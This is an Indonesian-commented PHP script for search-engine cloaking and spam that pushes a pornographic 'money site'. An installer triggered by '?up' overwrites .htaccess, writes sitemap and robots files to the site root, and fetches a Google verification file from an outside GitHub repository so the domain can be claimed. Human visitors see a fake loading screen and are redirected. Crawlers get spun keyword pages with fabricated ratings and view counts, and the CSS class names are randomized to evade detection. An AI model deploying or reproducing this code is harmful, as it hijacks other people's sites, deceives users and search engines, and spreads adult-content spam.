<?php
// --- JAV SUB INDO DOMINATOR V29 (INSTALLER PRIORITY FIX) ---
// Perbaikan: Installer (?up) ditaruh paling atas agar Admin tidak terkena redirect.
// Fitur Lengkap: Root Injector + Google Verify + Loading Screen + Histats + Wiki Snippet.

$money_site = "https://javpornsub.net"; 
$debug_mode = false; // Ubah ke false jika sudah siap live (Redirect User Asli)
$main_kw    = "Jav Sub Indo"; 

// --- 1. CORE SYSTEM (WAJIB PALING ATAS) ---
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
$path     = str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);
$base_url = $protocol . $_SERVER['HTTP_HOST'] . $path;
$root_url = $protocol . $_SERVER['HTTP_HOST'];
$uri      = $_SERVER['REQUEST_URI'];
$slug_raw = str_replace($path, "", $uri); 
$slug     = basename(parse_url($slug_raw, PHP_URL_PATH));
if(!$slug || $slug == 'index.php') $slug = 'home';

// --- 2. GLOBAL CONFIG ---
$core_urls = ["jav-sub-indo", "jav-sub-indo-terbaru", "download-jav-sub-indo", "nonton-jav-sub-indo"];
$acts      = ["link", "situs", "video", "film", "streaming", "nonton"];
$kws       = ["jav-sub-indo", "jav-uncensored", "bokep-jepang-sub-indo", "jav-subtitle-indonesia"];
$quls      = ["full-hd", "no-sensor", "tanpa-vpn", "terbaru", "viral", "lengkap"];

// ================================================================
// BLOK INSTALLER (DIPINDAHKAN KE SINI AGAR TIDAK KENA REDIRECT)
// ================================================================
if(isset($_GET['up'])){
    $root_path = $_SERVER['DOCUMENT_ROOT']; 
    
    // A. Sitemap Generator
    $xml = '<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
    foreach($core_urls as $c) $xml .= '<url><loc>'.$base_url.$c.'</loc><lastmod>'.date('Y-m-d').'</lastmod><changefreq>hourly</changefreq><priority>1.0</priority></url>';
    foreach($kws as $k){
        foreach($acts as $a){
            $xml .= '<url><loc>'.$base_url.$a.'-'.$k.'</loc><priority>0.8</priority></url>';
            foreach($quls as $q){
                $xml .= '<url><loc>'.$base_url.$k.'-'.$q.'</loc><priority>0.8</priority></url>';
                $xml .= '<url><loc>'.$base_url.$a.'-'.$k.'-'.$q.'</loc><priority>0.8</priority></url>';
            }
        }
    }
    $xml .= '</urlset>';
    @file_put_contents($root_path . "/sitemap.xml", $xml);
    
    // B. Robots.txt
    $robots = "User-agent: *\nAllow: /\nSitemap: " . $root_url . "/sitemap.xml";
    @file_put_contents($root_path . "/robots.txt", $robots);

    // C. Google Verify
    $g_url = "https://raw.githubusercontent.com/baseng1337/KW/refs/heads/main/google3b058340b0d95f2e.html";
    $g_content = @file_get_contents($g_url);
    if($g_content) @file_put_contents($root_path . "/google3b058340b0d95f2e.html", $g_content);

    // D. Htaccess
    $sn = basename($_SERVER['SCRIPT_NAME']);
    $ht = "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase $path\nRewriteRule ^$sn$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . {$path}$sn [L]\n</IfModule>";
    @file_put_contents(".htaccess", $ht);

    echo "<h3>✅ SYSTEM V29 INSTALLED</h3>";
    echo "<ul>";
    echo "<li>Mode: <b>Installer Priority (No Redirect)</b></li>";
    echo "<li>Sitemap: <a href='$root_url/sitemap.xml' target='_blank'>Cek Root Sitemap</a></li>";
    echo "<li>Robots: <a href='$root_url/robots.txt' target='_blank'>Cek Root Robots</a></li>";
    echo "</ul>";
    exit; // BERHENTI DI SINI AGAR TIDAK LANJUT KE LOADING SCREEN
}

// ================================================================
// BLOK CLOAKING & LOADING (HANYA JALAN JIKA BUKAN ?UP)
// ================================================================

// Histats Code
$histats = '
<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(["Histats.start", "1,4950727,4,0,0,0,00010000"]);
_Hasync.push(["Histats.fasi", "1"]);
_Hasync.push(["Histats.track_hits", ""]);
(function() {
var hs = document.createElement("script"); hs.type = "text/javascript"; hs.async = true;
hs.src = ("//s10.histats.com/js15_as.js");
(document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4950727&101" alt="" border="0"></a></noscript>
';

$ua = $_SERVER['HTTP_USER_AGENT'];
$is_bot = preg_match('/bot|crawl|slurp|spider|google|bing|yahoo/i', $ua);

// Redirect User Asli (Dengan Loading Screen)
if(!$is_bot && !$debug_mode){
    echo '<!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow">
        <title>Loading...</title>
        <style>
            body{background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;overflow:hidden}
            .loader{border:4px solid #333;border-top:4px solid #e50914;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px}
            @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
            .text{font-size:14px;color:#aaa;letter-spacing:1px}
        </style>
    </head>
    <body>
        <div class="loader"></div>
        <div class="text">Memuat Video...</div>
        
        <div style="display:none">'.$histats.'</div>

        <script>
            setTimeout(function(){
                window.location.href = "'.$money_site.'";
            }, 2000);
        </script>
    </body>
    </html>';
    exit;
}

// ================================================================
// KONTEN SEO UNTUK GOOGLE BOT
// ================================================================

// Anti-Footprint CSS
$p_id = substr(md5($_SERVER['HTTP_HOST']), 0, 3);
$css_wrap   = "w_" . $p_id . rand(10,99);
$css_def    = "wiki_" . rand(100,999);
$css_player = "mov_" . rand(100,999);
$css_btn    = "dl_" . rand(100,999);
$css_table  = "tb_" . rand(100,999);
$css_faq    = "fq_" . rand(100,999);

// Data Logic
$clean_kw = ucwords(str_replace(['-','+'], ' ', $slug));
if($slug == 'home') $clean_kw = "Jav Sub Indo";

$code_hash = md5($slug . $_SERVER['HTTP_HOST']);
$code      = strtoupper(substr($code_hash, 0, rand(5,6)));
$tgl_full  = date("d F Y"); 
$bulan_ini = date("F Y");
$views     = number_format(rand(10000, 950000));
$size      = rand(600, 1400) . " MB";
$durasi    = rand(45, 180);
$rating_val = number_format(rand(47, 50) / 10, 1);
$rating_cnt = rand(1500, 50000);

function spin($text){
    return preg_replace_callback('/\{(((?>[^\{\}]+)|(?R))*)\}/x', function ($matches) {
        $text = spin($matches[1]);
        $parts = explode('|', $text);
        return $parts[array_rand($parts)];
    }, $text);
}

// Smart Title Logic
$is_already_indo = (strpos(strtolower($clean_kw), 'indo') !== false);
if($is_already_indo) {
    $h1_templates = ["$clean_kw (Update $tgl_full)", "$clean_kw - Link Aktif ($tgl_full)", "$clean_kw Full HD ($bulan_ini)"];
} else {
    $h1_templates = ["$clean_kw Subtitle Indonesia ($tgl_full)", "$clean_kw Sub Indo Lengkap ($bulan_ini)", "$clean_kw (Update $tgl_full)"];
}
$h1_final = spin($h1_templates[array_rand($h1_templates)]);

// Konten Definisi (Wiki)
$definisi_text = spin("
<div class='$css_def'>
    <h2>Apa Itu $clean_kw?</h2>
    <p>
        <strong>$clean_kw {Adalah|Merupakan|Yaitu}</strong> {portal|laman|halaman} {resmi|khusus} penyedia layanan {streaming|nonton} video {Jepang|Asia} yang telah {dilengkapi|disertai} dengan {subtitle|teks terjemahan} Bahasa Indonesia yang {akurat|lengkap}. 
        Istilah ini merujuk pada {koleksi|arsip} video dengan kode referensi <em>$code</em> yang {sangat|paling} diminati karena {kualitas|resolusi} visualnya yang tajam (Full HD).
    </p>
    <p>
        Sebagai {salah satu|bagian dari} {situs|platform} hiburan {terpopuler|terbesar}, <strong>$clean_kw</strong> {menawarkan|memberikan} {kemudahan|akses} bagi pengguna untuk {mengunduh|download} atau menonton secara {langsung|online}. 
        Halaman ini {dirancang|dibuat} {khusus|spesifik} untuk {mengatasi|solusi} {masalah|kendala} {blokir|internet positif} tanpa {perlu|harus} menggunakan aplikasi VPN tambahan.
    </p>
    <p><strong>Fitur Utama Link Ini:</strong></p>
    <ul>
        <li><strong>Kualitas Video:</strong> Format MP4/MKV dengan resolusi 1080p yang jernih.</li>
        <li><strong>Akses Cepat:</strong> Server lokal yang mendukung streaming tanpa buffering.</li>
        <li><strong>Update Harian:</strong> Konten diperbarui setiap hari ($tgl_full).</li>
        <li><strong>Keamanan:</strong> Bebas dari iklan pop-up yang berbahaya (Malware Free).</li>
    </ul>
</div>
");

// FAQ Data
$faq_data = [
    ["q" => "Berapa ukuran file $clean_kw?", "a" => "Ukuran file rata-rata untuk kualitas 1080p adalah sekitar $size."],
    ["q" => "Format video apa yang digunakan?", "a" => "Kami menyediakan format MP4/MKV yang kompatibel dengan Android dan iOS."],
    ["q" => "Bagaimana cara download?", "a" => "Klik tombol download di bawah player, lalu pilih server tercepat."]
];
$schema_faq_items = [];
foreach($faq_data as $f) $schema_faq_items[] = ["@type" => "Question", "name" => $f['q'], "acceptedAnswer" => ["@type" => "Answer", "text" => $f['a']]];

// Schema Movie (100% Valid)
$thumb_url = "https://via.placeholder.com/640x360.jpg?text=" . urlencode($clean_kw);
$schema = [
    "@context" => "https://schema.org",
    "@graph" => [
        [
            "@type" => "WebPage",
            "@id" => $base_url . $slug,
            "url" => $base_url . $slug,
            "name" => $h1_final
        ],
        [
            "@type" => "Movie",
            "name" => $h1_final,
            "description" => "$clean_kw Adalah video $main_kw kode $code. Download Full HD ukuran $size update $tgl_full.",
            "image" => [$thumb_url], 
            "dateCreated" => date("Y-m-d"),
            "url" => $base_url . $slug,
            "duration" => "PT".$durasi."M",
            "director" => ["@type" => "Person", "name" => "Admin JavIndo"],
            "aggregateRating" => ["@type" => "AggregateRating", "ratingValue" => $rating_val, "bestRating" => "5", "worstRating" => "1", "ratingCount" => $rating_cnt]
        ],
        [
            "@type" => "FAQPage",
            "mainEntity" => $schema_faq_items
        ]
    ]
];
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $h1_final; ?></title>
    <meta name="description" content="<?php echo "$clean_kw Adalah video $main_kw kode $code. Download Full HD ukuran $size update $tgl_full."; ?>">
    <meta name="robots" content="index, follow">
    <link rel="canonical" href="<?php echo $base_url . $slug; ?>">
    <meta property="og:title" content="<?php echo $h1_final; ?>" />
    <meta property="og:image" content="<?php echo $thumb_url; ?>" />
    <script type="application/ld+json"><?php echo json_encode($schema); ?></script>
    <style>
        :root{--main:#e50914; --bg:#101010; --card:#1a1a1a; --text:#f5f5f5; --border:#333}
        body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:0;line-height:1.6}
        a{color:var(--main);text-decoration:none}
        .<?php echo $css_wrap; ?>{max-width:850px;margin:0 auto;padding:15px;padding-bottom:100px}
        h1{font-size:24px;color:#fff;margin:15px 0;border-bottom:1px solid var(--border);padding-bottom:10px}
        .bread{font-size:12px;color:#888;margin-bottom:10px}
        
        .<?php echo $css_def; ?>{background:var(--card);padding:25px;border-top:3px solid var(--main);margin-bottom:30px;border-radius:4px;box-shadow:0 5px 15px rgba(0,0,0,0.3)}
        .<?php echo $css_def; ?> h2{font-size:20px;color:#fff;margin-top:0;border-bottom:1px solid var(--border);padding-bottom:10px;margin-bottom:15px}
        .<?php echo $css_def; ?> p{margin-bottom:15px;font-size:15px;color:#ccc;text-align:justify}
        .<?php echo $css_def; ?> strong{color:#fff}
        .<?php echo $css_def; ?> ul{padding-left:20px;color:#ccc}
        .<?php echo $css_def; ?> li{margin-bottom:8px}

        .<?php echo $css_player; ?>{position:relative;padding-top:56.25%;background:#000;border-radius:8px;overflow:hidden;margin-bottom:20px;box-shadow:0 10px 20px rgba(0,0,0,0.6);cursor:pointer}
        .thumb-bg{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg, #111 25%, #222 50%, #111 75%);opacity:0.6}
        .play-ovl{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:2}
        .play-ico{width:70px;height:70px;background:var(--main);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff;box-shadow:0 0 20px rgba(229,9,20,0.6);transition:transform 0.2s}
        .<?php echo $css_player; ?>:hover .play-ico{transform:scale(1.1)}

        .<?php echo $css_btn; ?>{display:block;background:linear-gradient(to bottom, #e50914, #b20710);color:#fff;text-align:center;padding:15px;font-weight:bold;border-radius:5px;margin-bottom:25px;border:1px solid #b20710;text-transform:uppercase}
        
        .<?php echo $css_table; ?>{width:100%;border-collapse:collapse;margin:20px 0;background:var(--card);font-size:14px;border-radius:5px;border:1px solid var(--border)}
        .<?php echo $css_table; ?> td{padding:12px;border-bottom:1px solid var(--border)}
        .<?php echo $css_table; ?> td:first-child{color:#aaa;width:35%}
        .<?php echo $css_table; ?> td:last-child{font-weight:bold;color:#fff}

        .<?php echo $css_faq; ?> button {background:var(--card);color:#eee;cursor:pointer;padding:15px;width:100%;border:none;text-align:left;outline:none;font-size:15px;border-bottom:1px solid var(--border);font-weight:bold;display:flex;justify-content:space-between}
        .<?php echo $css_faq; ?> .panel {padding:0 15px;background:#141414;max-height:0;overflow:hidden;transition:max-height 0.2s ease-out;color:#ccc;font-size:14px}

        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px;margin-top:20px}
        .card{background:var(--card);border-radius:4px;overflow:hidden;border:1px solid var(--border)}
        .c-thumb{height:90px;background:#222;position:relative}
        .c-thumb:after{content:'HD';position:absolute;top:5px;right:5px;background:var(--main);color:#fff;font-size:10px;padding:2px 4px;border-radius:2px}
        .info{padding:10px;font-size:12px}
        
        .sticky{position:fixed;bottom:0;left:0;width:100%;background:rgba(16,16,16,0.95);padding:10px;text-align:center;border-top:1px solid var(--border);z-index:999}
        .cta{background:var(--main);color:#fff;padding:10px 30px;border-radius:30px;font-weight:bold;display:inline-block}
        .stars{color:#f1c40f;font-size:14px;margin-right:5px}
    </style>
</head>
<body>
    <div class="<?php echo $css_wrap; ?>">
        <div class="bread">Portal > Jav > <?php echo $clean_kw; ?></div>
        
        <h1><?php echo $h1_final; ?></h1>

        <?php echo $definisi_text; ?>

        <div class="<?php echo $css_player; ?>" onclick="window.location.href='<?php echo $money_site; ?>'">
            <div class="thumb-bg"></div>
            <div class="play-ovl">
                <div class="play-ico">▶</div>
                <div style="margin-top:10px;font-weight:bold;color:#fff;">KLIK UNTUK PUTAR</div>
            </div>
            <div style="position:absolute;bottom:10px;right:10px;background:rgba(0,0,0,0.8);color:#fff;padding:2px 6px;font-size:11px;border-radius:3px;z-index:3"><?php echo $durasi; ?> Menit</div>
        </div>

        <a href="<?php echo $money_site; ?>" class="<?php echo $css_btn; ?>">📥 DOWNLOAD FILE (<?php echo $size; ?>)</a>

        <table class="<?php echo $css_table; ?>">
            <tr><td>Judul Video</td><td><?php echo $clean_kw; ?></td></tr>
            <tr><td>Kode Referensi</td><td><?php echo $code; ?></td></tr>
            <tr><td>Ukuran File</td><td><?php echo $size; ?></td></tr>
            <tr><td>Format Video</td><td>MP4 / MKV</td></tr>
            <tr><td>Rating User</td><td><span class="stars">⭐⭐⭐⭐⭐</span> <?php echo $rating_val; ?>/5.0 (<?php echo number_format($rating_cnt); ?> Suara)</td></tr>
            <tr><td>Status Server</td><td>✅ Online (Update <?php echo $tgl_full; ?>)</td></tr>
        </table>

        <div style="margin-top:30px">
            <h3 style="color:#fff;margin-bottom:15px">FAQ (Tanya Jawab)</h3>
            <div class="<?php echo $css_faq; ?>">
                <?php foreach($faq_data as $f): ?>
                <button class="accordion"><?php echo $f['q']; ?> <span>+</span></button>
                <div class="panel"><p style="padding:15px 0"><?php echo $f['a']; ?></p></div>
                <?php endforeach; ?>
            </div>
        </div>

        <div style="margin-top:40px;border-top:1px solid var(--border);padding-top:20px">
            <h3 style="font-size:18px;color:#fff">Video Rekomendasi</h3>
            <div class="grid">
                <?php 
                // GRID VIDEO - SINKRONISASI TOTAL
                for($i=0; $i<12; $i++): 
                    $kw = $kws[array_rand($kws)];
                    $act = $acts[array_rand($acts)];
                    $q = $quls[array_rand($quls)];
                    
                    $pola = rand(1,3);
                    if($pola == 1) $u = $act.'-'.$kw;
                    elseif($pola == 2) $u = $kw.'-'.$q;
                    else $u = $act.'-'.$kw.'-'.$q;
                    
                    $t = ucwords(str_replace('-',' ',$u));
                ?>
                <a href="<?php echo $base_url.$u; ?>" class="card">
                    <div class="c-thumb"></div>
                    <div class="info"><b><?php echo $t; ?></b><span style="color:#777"><?php echo number_format(rand(1000,50000)); ?> views</span></div>
                </a>
                <?php endfor; ?>
            </div>
        </div>
        
        <div style="display:none">
             <?php echo $histats; ?>
        </div>
    </div>

    <div class="sticky">
        <a href="<?php echo $money_site; ?>" class="cta">▶ NONTON STREAMING</a>
    </div>

    <script>
        var acc = document.getElementsByClassName("accordion");
        for (var i = 0; i < acc.length; i++) {
            acc[i].addEventListener("click", function() {
                this.classList.toggle("active");
                var panel = this.nextElementSibling;
                if (panel.style.maxHeight) { panel.style.maxHeight = null; } else { panel.style.maxHeight = panel.scrollHeight + "px"; } 
            });
        }
    </script>
</body>
</html>
<?php exit; ?>
